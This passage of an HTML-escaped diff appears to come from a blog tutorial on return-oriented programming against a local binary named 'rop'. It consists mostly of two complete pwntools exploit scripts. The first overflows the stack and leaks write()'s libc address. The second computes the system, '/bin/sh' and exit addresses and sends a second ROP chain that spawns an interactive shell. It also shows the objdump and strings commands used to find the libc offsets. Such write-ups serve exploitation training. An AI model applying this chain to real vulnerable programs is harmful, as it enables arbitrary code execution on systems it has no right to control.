+&lt;p&gt;Here is python code for part one:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;#!&#x2F;bin&#x2F;python
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;*
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;context.log_level &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;debug&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;context.terminal  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;tilix&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;-a&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;session-add-right&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;-e&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;# Stage 1 data
+&lt;&#x2F;span&gt;&lt;span&gt;main_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400537
+&lt;&#x2F;span&gt;&lt;span&gt;write_address_got &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x601018
+&lt;&#x2F;span&gt;&lt;span&gt;write_plt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400430
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;# Gadgets
+&lt;&#x2F;span&gt;&lt;span&gt;rdi_gadget &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400613
+&lt;&#x2F;span&gt;&lt;span&gt;rsi_gadget &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400611
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;proc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;process(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;.&#x2F;rop&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Stage one&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;# Input str
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Receive input&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;72 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(rdi_gadget) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(rsi_gadget)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(write_address_got) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(write_plt) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(main_address)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;#gdb.attach(&amp;#39;rop&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Send payload&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.send(payload)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Receiving write address&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;# Take only 8 bytes (this will be write address in libc)
+&lt;&#x2F;span&gt;&lt;span&gt;leaked_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;write_libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;u64(leaked_address)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;write address in libc: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(write_libc_address)}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.close()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;calculating-the-libc-address&quot;&gt;Calculating the libc address&lt;&#x2F;h2&gt;
+&lt;p&gt;Now when we got a write address we need a libc address.
+The libc address can be easily calculated:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;libc_address = obtained_write_address - write_libc_offset
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Finding write offset in libc:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# objdump -d -M intel &#x2F;lib64&#x2F;libc.so.6 | grep &amp;quot;&amp;lt;__write&amp;gt;:&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;00000000000f2520 &amp;lt;__write&amp;gt;:
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;obtaining-the-rest-of-addresses&quot;&gt;Obtaining the rest of addresses&lt;&#x2F;h2&gt;
+&lt;p&gt;When we got the libc address we can calculate the rest addresses:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;system_libc = libc_address + system_libc_offset
+&lt;&#x2F;span&gt;&lt;span&gt;bin_sh_libc = libc_address + bin_sh_libc_offset
+&lt;&#x2F;span&gt;&lt;span&gt;exit_libc = libc_address + exit_libc_offset
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Required offsets:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# objdump -d -M intel &#x2F;lib64&#x2F;libc.so.6 | grep &amp;quot;libc_system&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000049e4a &amp;lt;.annobin___libc_system.start&amp;gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000049e50 &amp;lt;__libc_system&amp;gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;   49e57:	74 07                	je     49e60 &amp;lt;__libc_system+0x10&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000049e7d &amp;lt;.annobin___libc_system.end&amp;gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;#objdump -d -M intel &#x2F;lib64&#x2F;libc.so.6 | grep &amp;quot;&amp;lt;exit&amp;gt;:&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;000000000003f530 &amp;lt;exit&amp;gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;# strings -tx &#x2F;lib64&#x2F;libc.so.6 | grep &#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span&gt; 18f143 &#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;spawning-a-shell&quot;&gt;Spawning a shell&lt;&#x2F;h1&gt;
+&lt;p&gt;The second payload:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;‘A’*72 &lt;&#x2F;li&gt;
+&lt;li&gt;address of rdi gadget&lt;&#x2F;li&gt;
+&lt;li&gt;address of “&#x2F;bin&#x2F;sh” string&lt;&#x2F;li&gt;
+&lt;li&gt;address of system&lt;&#x2F;li&gt;
+&lt;li&gt;address of exit&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;#!&#x2F;bin&#x2F;python
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;*
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;# Stage 1 data
+&lt;&#x2F;span&gt;&lt;span&gt;main_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400537
+&lt;&#x2F;span&gt;&lt;span&gt;write_address_got &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x601018
+&lt;&#x2F;span&gt;&lt;span&gt;write_plt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400430
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;# Gadgets
+&lt;&#x2F;span&gt;&lt;span&gt;rdi_gadget &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400613
+&lt;&#x2F;span&gt;&lt;span&gt;rsi_gadget &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x400611
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;#libc offsets
+&lt;&#x2F;span&gt;&lt;span&gt;write_libc_offset &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0xf2520
+&lt;&#x2F;span&gt;&lt;span&gt;system_libc_offset &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x49e50
+&lt;&#x2F;span&gt;&lt;span&gt;sh_libc_offset &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x18f143&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;#0x18f148
+&lt;&#x2F;span&gt;&lt;span&gt;exit_libc_offset &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x3f530
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;proc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;process(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;.&#x2F;rop&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Stage one&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Receive input&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;72 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(rdi_gadget) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(rsi_gadget)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(write_address_got) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(write_plt) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(main_address)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Send first payload&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.send(payload)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Receiving write address&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;leaked_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;write_libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;u64(leaked_address)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;write address in libc: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(write_libc_address)}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;write_libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;write_libc_offset
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;# Calculate required addresses
+&lt;&#x2F;span&gt;&lt;span&gt;system_libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;system_libc_offset
+&lt;&#x2F;span&gt;&lt;span&gt;sh_libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;sh_libc_offset
+&lt;&#x2F;span&gt;&lt;span&gt;exit_libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;libc_address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;exit_libc_offset
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;system address in libc: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(system_libc_address)}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;sh address in libc: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(sh_libc_address)}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Stage two&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;shellcode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;72 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(rdi_gadget) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(sh_libc_address) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(system_libc_address) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;p64(exit_libc_address)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Send second payload&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.send(shellcode)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.recv()
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Shell spawned&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;proc.interactive()
